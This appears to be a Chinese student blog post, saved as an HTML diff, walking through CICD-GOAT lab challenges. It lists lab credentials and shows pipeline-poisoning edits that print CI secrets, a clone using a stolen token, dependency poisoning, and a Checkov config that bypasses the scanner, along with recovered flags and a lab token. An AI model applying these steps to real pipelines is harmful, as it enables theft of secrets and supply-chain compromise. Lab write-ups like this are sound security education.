@@ -1,0 +1,410 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>云安全：CICD靶场实操 | Vincent</title><meta name="author" content="Tardfyou"><meta name="copyright" content="Tardfyou"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学校的云安全攻防课程结课了，大作业是从CICD-GOAT靶场找flag。本次拿下了靶场热门的11个flag，再次记录详细过程，以便后续学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="云安全：CICD靶场实操">
+<meta property="og:url" content="https://tardfyou.github.io/2024/12/11/%E4%BA%91%E5%AE%89%E5%85%A8%EF%BC%9ACICD%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D/index.html">
+<meta property="og:site_name" content="Vincent">
+<meta property="og:description" content="学校的云安全攻防课程结课了，大作业是从CICD-GOAT靶场找flag。本次拿下了靶场热门的11个flag，再次记录详细过程，以便后续学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://external-preview.redd.it/e1vPmXFtQrlXfTyvRJ-J7CqaRWOVljVLAJtPcRxeR2c.jpg?auto=webp&s=2a7bd02c4ee80268eb5a7f6e52b4080b5504a458">
+<meta property="article:published_time" content="2024-12-11T07:34:52.000Z">
+<meta property="article:modified_time" content="2024-12-11T09:04:37.061Z">
+<meta property="article:author" content="Tardfyou">
+<meta property="article:tag" content="learning">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://external-preview.redd.it/e1vPmXFtQrlXfTyvRJ-J7CqaRWOVljVLAJtPcRxeR2c.jpg?auto=webp&s=2a7bd02c4ee80268eb5a7f6e52b4080b5504a458"><link rel="shortcut icon" href="/img/web.jpg"><link rel="canonical" href="https://tardfyou.github.io/2024/12/11/%E4%BA%91%E5%AE%89%E5%85%A8%EF%BC%9ACICD%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '云安全：CICD靶场实操',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-11 17:04:37'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/scrollbar.css"><link rel="stylesheet" href="/css/aplayerdiy.css"><link rel="stylesheet" href="/css/mouse.css"><link rel="stylesheet" href="/css/footer.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Vincent" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/motion.gif" data-original="/img/train1.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> MessageBoard</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://external-preview.redd.it/e1vPmXFtQrlXfTyvRJ-J7CqaRWOVljVLAJtPcRxeR2c.jpg?auto=webp&amp;s=2a7bd02c4ee80268eb5a7f6e52b4080b5504a458')"><nav id="nav"><span id="blog-info"><a href="/" title="Vincent"><span class="site-name">Vincent</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> MessageBoard</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">云安全：CICD靶场实操</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-11T07:34:52.000Z" title="Created 2024-12-11 15:34:52">2024-12-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-11T09:04:37.061Z" title="Updated 2024-12-11 17:04:37">2024-12-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Cloud-Security/">Cloud Security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">4.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>15min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="云安全：CICD靶场实操"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>针对实操项目，发现了11个flag（文中将详细给出解题流程和遇到的问题），分别如下：</p>
+</blockquote>
+<h2 id="第一项：实操部分"><a href="#第一项：实操部分" class="headerlink" title="第一项：实操部分"></a><strong>第一项：实操部分</strong></h2><h3 id="准备、环境搭建和配置"><a href="#准备、环境搭建和配置" class="headerlink" title=" 准备、环境搭建和配置"></a><code> </code><strong>准备、环境搭建和配置</strong></h3><p>对于本次云安全cicd-goat靶场实验，最开始选用ubuntu18.04虚拟机进行实验，后续进行中发现，容器启动会会出现极其卡顿的现象，以及无法访问gitlab。于是更换ubuntu22.04分配8G内存解决卡顿问题，通过配置代理解决gitlab无法访问的问题。按照官网完成了安装工作。<br><img src="/img/motion.gif" data-original="/images/cloud/1.png"><br>然后就是各个站点登陆账密。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Jenkins：http://localhost:8080</span><br><span class="line">Username: alice</span><br><span class="line">Password: alice</span><br><span class="line">Gitea：http://localhost:3000</span><br><span class="line">Username: thealice</span><br><span class="line">Password: thealice</span><br><span class="line">GitLab http://localhost:4000</span><br><span class="line">Username: alice</span><br><span class="line">Password: ali12345 //已经改了，教程里还没更新</span><br><span class="line"></span><br><span class="line">CTFd</span><br><span class="line">Username: admin</span><br><span class="line">Password: ciderland5#</span><br><span class="line">Jenkins</span><br><span class="line">Username: admin</span><br><span class="line">Password: ciderland5#</span><br><span class="line">Gitea</span><br><span class="line">Username: red\_queen</span><br><span class="line">Password: ciderland5#</span><br><span class="line">Gitlab</span><br><span class="line">Username:root</span><br><span class="line">Password:ciderland5#</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="一、PPE类型漏洞"><a href="#一、PPE类型漏洞" class="headerlink" title="一、PPE类型漏洞"></a><strong>一、PPE类型漏洞</strong></h3><p>下面结合所做的几道PPE类型漏洞题目进行讲解。</p>
+<p>首先对PPE漏洞的内容进行了自学了解。PPE漏洞是一种与预处理环境相关的安全漏洞，主要出现在处理数据或配置文件时，系统对输入未充分验证，导致攻击者可以以特定方式操控输入。通常发生在程序预处理阶段如读取配置文件、处理模板、构建命令行等。在本次靶场实操当中，预处理阶段，主要发生在项目重新build的过程中。这类风险通常在代码仓库中，可控对应CI管道配置文件，修改CI配置文件达到执行命令目的。如Jenkinsfile，.gitlab-ci.yml，.circleci/config.tml，以及位于.github/workflows下的Github Actions YAML文件。当黑客提交修改申请的时候，管理员配置好的WebHook就会触发对应配置文件，从而执行配置文件中定义的流水线。</p>
+<p>而PPE风险具体有三种主要类型组成：</p>
+<ul>
+<li>Direct(D-PPE)：在 D-PPE 场景中，攻击者修改他们有权访问的代码仓库中的 CI 配置文件（如Jenkins的Jenkinsfile文件），通过直接将更改推送到代码仓库上未受保护的远程分支。由于 CI 管道执行是由“push”或“PR”事件触发WebHook的，并且管道执行的命令是由修改后的 CI 配置文件中的内容定义的，一旦构建管道被恶意篡改，攻击者的恶意命令最终是会在构建节点中运行、触发。</li>
+<li>Indirect(I-PPE)：如果CI的流水线定义不是在代码仓库中的配置文件定义，而是在CI系统（Jenkins）自身定义的。仍然可以通过代码仓库中存在的文件进行恶意代码执行，如Makefile文件、管道中自定义执行的shell脚本。通过间接插入恶意代码到管道中执行的脚本，达到恶意代码植入。</li>
+<li>Public(P-PPE,or 3PE)：从公共的代码仓库拉取的代码，如果攻击者通过公共仓库进行投毒，会对CI系统造成破坏，如果CI系统在内网，甚至可能进一步危害内网安全。现在再来看看该题目的解题过程，Jenkins针对该题目有个对应的CI管道，会轮询Gitea地址上的项目，这里需要在Jenkins的系统配置里面改动下目标地址。</li>
+</ul>
+<h4 id="1、PPE类型漏洞发现入口"><a href="#1、PPE类型漏洞发现入口" class="headerlink" title="1、PPE类型漏洞发现入口"></a><strong>1、PPE类型漏洞发现入口</strong></h4><p>在 <strong>Jenkins</strong> 中，管道（Pipeline）是实现持续集成和持续交付的核心工具，用于定义构建、测试和部署的全过程。管道以脚本形式配置，可以高度灵活地处理任务。然而，这种灵活性也使得 Jenkins 管道容易受到 <strong>PPE 漏洞</strong> 的威胁。Jenkins支持声明形式的直观的管道和基于Groovy的完整脚本语言，管道脚本会运行这Jenkins的执行环境中，并且能够访问节点，工作空间，环境变量等资源，为执行任务提供遍历，但也可能成为漏洞利用的源头。如对于Jenkinsfile，可能未检查用户输入直接执行系统命令，或者控制环境变量内容，动态执行攻击者提供的恶意Groovy脚本，导致敏感文件泄露或任意文件操作等问题。<br><img src="/img/motion.gif" data-original="/images/cloud/2.png"></p>
+<h4 id="2、PPE类型漏洞利用过程"><a href="#2、PPE类型漏洞利用过程" class="headerlink" title="2、PPE类型漏洞利用过程"></a><strong>2、PPE类型漏洞利用过程</strong></h4><p>下面结合所找的flag具体介绍利用漏洞的过程。</p>
+<h5 id="White-Rabbit"><a href="#White-Rabbit" class="headerlink" title="White Rabbit"></a><strong>White Rabbit</strong></h5><p>访问项目对应的gieta仓库，直接ls发现存在Jenkinsfile文件，clone下来尝试注入恶意代码。<br><img src="/img/motion.gif" data-original="/images/cloud/3.png"><br>然后创建新分支，推送到仓库中并创建pull request。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b task1 //创建且切换到新分支</span><br><span class="line">git add \* </span><br><span class="line">git commit -m <span class="string">"first flag"</span></span><br><span class="line">git push -u origin task1 //提交到新分支</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/img/motion.gif" data-original="/images/cloud/4.png"><br>去Jenkins中查看pipeline构建过程。<br><img src="/img/motion.gif" data-original="/images/cloud/5.png"><br>成功获得flag。<br><img src="/img/motion.gif" data-original="/images/cloud/6.png"></p>
+<h5 id="Mad-Hatter"><a href="#Mad-Hatter" class="headerlink" title="Mad Hatter"></a><strong>Mad Hatter</strong></h5><p>Mad Hatter有两个仓库，一个仓库存储代码，另一个存储pipeline配置文件，对于配置文件所在仓库没法直接git push，因此就是PPE漏洞的变种，间接PPE。综上来看，需要修改makefile来输出flag，运行的Jenkinsfile是独立仓库无权修改CI管道配置文件，考点是I-PPE。</p>
+<p>对makefile文件进行修改：<br><img src="/img/motion.gif" data-original="/images/cloud/7.png"></p>
+<figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">whoami:</span></span><br><span class="line">    echo $FLAG|base64</span><br></pre></td></tr></tbody></table></figure>
+<p>重复之前的操作<br><img src="/img/motion.gif" data-original="/images/cloud/8.png"></p>
+<p>发现有问题。<br><img src="/img/motion.gif" data-original="/images/cloud/9.png"></p>
+<p>发现其他网上的文档里没有提到这个问题，发现是需要将变量括起来。<br><img src="/img/motion.gif" data-original="/images/cloud/10.png"><br><img src="/img/motion.gif" data-original="/images/cloud/11.png"></p>
+<h5 id="Caterpillar"><a href="#Caterpillar" class="headerlink" title="Caterpillar"></a><strong>Caterpillar</strong></h5><p>此题不同于之前的PPE题目，先从结果开始分析，在Jenkins中发现有两个该项目的job，一个是test一个是prod。对于test，查看配置发现如果forks的项目发起了对main的pr就会触发pipeline并且信任所有人，相当于public-ppe。对于prod的配置，第一个是不含pr的分支，第二个是pr的分支。于是fork下来项目，clone fork的项目后修改配置文件读取env。考虑题目三个提示：分叉存储库，执行恶意代码后依赖环境变量继续前进，管道中找到gitea访问令牌。<br><img src="/img/motion.gif" data-original="/images/cloud/12.png"><br>老步骤提交，并且创建pr读取到env获得原仓库内容。于是clone原仓库。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> http://5d3ed5564341d5060c8524c41fe03507e296ca46@192.168.249.131:3000/Wonderland/caterpillar.git</span><br></pre></td></tr></tbody></table></figure>
+<p>该令牌具备写权限，于是修改配置文件，老步骤操作。<br><img src="/img/motion.gif" data-original="/images/cloud/13.png"><br>拿到flag：<br><img src="/img/motion.gif" data-original="/images/cloud/14.png"><br>test管道没有我们需要的flag2凭据，但是在prod中存在，而触发prod需要通过分支合并才能执行，所以需要通过第一个test管道获取仓库token，创建分支再获取flag2.</p>
+<h5 id="Cheshire-Cat"><a href="#Cheshire-Cat" class="headerlink" title="Cheshire Cat"></a><strong>Cheshire Cat</strong></h5><p>查看题目提示：All jobs in your victim’s Jenkins instance run on dedicated nodes, but that’s not good enough for you，尝试执行D-PPE攻击，尝试找到控制器标签，搞清楚Jenkinsfile如何指示运行作业。也就是需要指定node来执行，一般执行是在agent1上，所以需要指定执行到另一个node也就是仅剩的built-in，其label是built-in。</p>
+<p>clone下来后修改Jenkinsfile：<br><img src="/img/motion.gif" data-original="/images/cloud/15.png"><br>指定agent是built-in，从文件系统里读取flag。<br>同样的流程操作以及创建pr，查看console output即可。<br><img src="/img/motion.gif" data-original="/images/cloud/16.png"></p>
+<h5 id="Mock-Turtle"><a href="#Mock-Turtle" class="headerlink" title="Mock Turtle"></a><strong>Mock Turtle</strong></h5><p>Jenkins代码涉及三层判断，分别是检查增加的单词数和减少的单词数必须相同，判断version文件是否一行且满足x.y.z搁置，判断pr中是否修改了version，满足则merge。</p>
+<p>于是修改Jenkinsfile，version，以及readme.md以满足三个条件。<br><img src="/img/motion.gif" data-original="/images/cloud/17.png"></p>
+<p>创建pr，查看发现自动合并，再查看main中再次触发的管道。拿到flag。</p>
+<h4 id="3、PPE类型漏洞利用结果"><a href="#3、PPE类型漏洞利用结果" class="headerlink" title="3、PPE类型漏洞利用结果"></a><strong>3、PPE类型漏洞利用结果</strong></h4><h5 id="White-rabbit"><a href="#White-rabbit" class="headerlink" title="White rabbit"></a><strong>White rabbit</strong></h5><p>对base64解码即可拿到实际内容。<br><img src="/img/motion.gif" data-original="/images/cloud/40.png"><br><code>flag1:.06165DF2-C047-4402-8CAB-1C8EC526C115.</code></p>
+<h5 id="Mad-Hatter-1"><a href="#Mad-Hatter-1" class="headerlink" title="Mad Hatter"></a><strong>Mad Hatter</strong></h5><p><code>base64解码后flag2：ACD6E6B8-3584-4F43-AB9C-ACD080B8EBB2</code></p>
+<h5 id="Caterpillar-1"><a href="#Caterpillar-1" class="headerlink" title="Caterpillar"></a><strong>Caterpillar</strong></h5><p><code>Decode: AEB14966-FFC2-4FB0-BF45-CD903B3535DA</code></p>
+<h5 id="Cheshire-Cat-1"><a href="#Cheshire-Cat-1" class="headerlink" title="Cheshire Cat"></a><strong>Cheshire Cat</strong></h5><p><code>Decode: 6B31A679-6D70-469D-9F8D-6D6E80B3C29C</code></p>
+<h5 id="Mock-Turtle-1"><a href="#Mock-Turtle-1" class="headerlink" title="Mock Turtle"></a><strong>Mock Turtle</strong></h5><p><img src="/img/motion.gif" data-original="/images/cloud/18.png"></p>
+<h3 id="二、代码库敏感信息泄露漏洞"><a href="#二、代码库敏感信息泄露漏洞" class="headerlink" title="二、代码库敏感信息泄露漏洞"></a><strong>二、代码库敏感信息泄露漏洞</strong></h3><h4 id="1、漏洞发现入口"><a href="#1、漏洞发现入口" class="headerlink" title="1、漏洞发现入口"></a><strong>1、漏洞发现入口</strong></h4><p><strong>Gitleaks</strong> 是一个开源工具，主要用于扫描代码库中的敏感信息泄露漏洞。它能够快速检测 Git 仓库中可能包含的机密数据，例如 API 密钥、访问令牌、密码、私钥等。这些敏感信息一旦泄露，可能被攻击者利用，从而对系统的安全性造成严重威胁。Gitleaks针对的主要漏洞类别有API密钥和访问令牌泄露。私钥或证书泄露，用户名和密码泄露。配置文件和环境变量泄露。敏感文件路径暴露和外部服务凭据。未授权的配置或调试信息。</p>
+<p>Gitleaks的功能特点就是提供了一组预定义规则，可以检测多种常见敏感信息类型，如AWS密钥，JWT，OAuth令牌等。支持本地，远程，增量扫描。</p>
+<h4 id="2、漏洞利用过程"><a href="#2、漏洞利用过程" class="headerlink" title="2、漏洞利用过程"></a><strong>2、漏洞利用过程</strong></h4><h5 id="Duchess"><a href="#Duchess" class="headerlink" title="Duchess"></a><strong>Duchess</strong></h5><p>首先查看描述，发现存储库中存在Pypi token（是 Python Package Index（PyPI）提供的一种身份验证方式，用于开发者在发布或管理 Python 包时验证其身份。它是一种访问令牌（Access Token），可以替代传统的用户名和密码登录方式，提供更安全、更便捷的认证手段），于是考虑到是存储库代码的信息收集。安装配置gitleak，设置环境变量（不详细介绍了），然后将检测结果导出到output.json。综合来看，考点是CICD-SEC-6凭证安全。<code>gitleaks detect -s . -r output.json</code><br><img src="/img/motion.gif" data-original="/images/cloud/19.png"><br>查看输出，匹配字符串PyPI拿到flag。<br><img src="/img/motion.gif" data-original="/images/cloud/20.png"></p>
+<h4 id="3、漏洞利用结果"><a href="#3、漏洞利用结果" class="headerlink" title="3、漏洞利用结果"></a><strong>3、漏洞利用结果</strong></h4><h5 id="Duchess-1"><a href="#Duchess-1" class="headerlink" title="Duchess"></a><strong>Duchess</strong></h5><p><code>pypi-AgEIcHlwaS5vcmcCJGNmNTI5MjkyLWYxYWMtNDEwYS04OTBjLWE4YzNjNGY1ZTBiZAACJXsicGVybWlzc2lvbnMiOiAidXNlciIsICJ2ZXJzaW9uIjogMX0AAAYg7T5yHIewxGoh-3st7anbMSCoGhb-U3HnzHAFLHBLNBY</code></p>
+<h3 id="三、依赖项投毒漏洞"><a href="#三、依赖项投毒漏洞" class="headerlink" title="三、依赖项投毒漏洞"></a><strong>三、依赖项投毒漏洞</strong></h3><h4 id="1、漏洞发现入口-1"><a href="#1、漏洞发现入口-1" class="headerlink" title="1、漏洞发现入口"></a><strong>1、漏洞发现入口</strong></h4><p>不再是直接修改Jenkinsfile文件，更多的需要审计其它源码，会出现多个仓库之间的联动，需要理解仓库之间的可控与不可控关系，结合其它文件进行利用。</p>
+<h4 id="2、漏洞利用过程-1"><a href="#2、漏洞利用过程-1" class="headerlink" title="2、漏洞利用过程"></a><strong>2、漏洞利用过程</strong></h4><h5 id="Twiddledum"><a href="#Twiddledum" class="headerlink" title="Twiddledum"></a><strong>Twiddledum</strong></h5><p>目标是一个文件夹，gitea上存在两个仓库，分别是dee和dum后缀，尝试在Jenkins build dum，发现pipeline中执行了node index.js,其中require dee，考虑到dum不可控，dee可控，尝试往dee中注入恶意代码。先clone下来dee修改index.js。考点是管道项目的依赖项目可能存在供应链攻击，给dee依赖投毒，导致管道仓库dum也执行相关命令。<br><img src="/img/motion.gif" data-original="/images/cloud/21.png"><br>直接往main分支push。</p>
+<p>审计dum的package.json:<br><img src="/img/motion.gif" data-original="/images/cloud/22.png"><br>其通过字下载twiddledee的tag为1.1.0的源码来更新，因此需要删除目前的1.1.0版本，重新以不同版本号发布。<br><img src="/img/motion.gif" data-original="/images/cloud/23.png"><br>重新build即可获得flag。</p>
+<p>参考文档，push的时候打上新的flag也是可行的。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git tag 1.2.0 HEAD</span><br><span class="line">git push origin 1.2.0</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="3、漏洞利用结果-1"><a href="#3、漏洞利用结果-1" class="headerlink" title="3、漏洞利用结果"></a><strong>3、漏洞利用结果</strong></h4><h5 id="Twiddledum-1"><a href="#Twiddledum-1" class="headerlink" title="Twiddledum"></a><strong>Twiddledum</strong></h5><p><img src="/img/motion.gif" data-original="/images/cloud/24.png"></p>
+<h3 id="四、扫描器劫持漏洞"><a href="#四、扫描器劫持漏洞" class="headerlink" title="四、扫描器劫持漏洞"></a><strong>四、扫描器劫持漏洞</strong></h3><h4 id="1、漏洞发现入口-2"><a href="#1、漏洞发现入口-2" class="headerlink" title="1、漏洞发现入口"></a><strong>1、漏洞发现入口</strong></h4><p>控制 SATA（Serial ATA）扫描器的漏洞，主要与扫描器的配置管理、输入验证和执行环境有关。如果 SATA 扫描器通过配置文件控制其行为（如扫描参数、目标范围、规则设置等），配置文件的不当设计或保护不足可能会导致以下安全问题：配置文件注入，配置文件路径遍历，未经授权的配置修改，敏感数据暴露，动态加载配置的命令执行。</p>
+<p>阅读Checkov，管道中引入了SATA静态扫描工具。介绍了其会读取仓库中配置文件作为运行配置，可以劫持checkov的配置。</p>
+<h4 id="2、漏洞利用过程-2"><a href="#2、漏洞利用过程-2" class="headerlink" title="2、漏洞利用过程"></a><strong>2、漏洞利用过程</strong></h4><h5 id="Dodo"><a href="#Dodo" class="headerlink" title="Dodo"></a><strong>Dodo</strong></h5><p>创建一个.checkov.yml</p>
+<figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">soft-fail:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">check:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">THIS\_NOT\_THE\_CHECK\_YOUR\_ARE\_LOOKING\_FOR</span></span><br></pre></td></tr></tbody></table></figure>
+<p>修改main.tf中对应位置acl为public-read：<br><img src="/img/motion.gif" data-original="/images/cloud/25.png"><br>再次build即可绕过检测拿到flag。</p>
+<h4 id="3、漏洞利用结果-2"><a href="#3、漏洞利用结果-2" class="headerlink" title="3、漏洞利用结果"></a><strong>3、漏洞利用结果</strong></h4><h5 id="Dodo-1"><a href="#Dodo-1" class="headerlink" title="Dodo"></a><strong>Dodo</strong></h5><p>重新build即可拿到flag，不再赘述。</p>
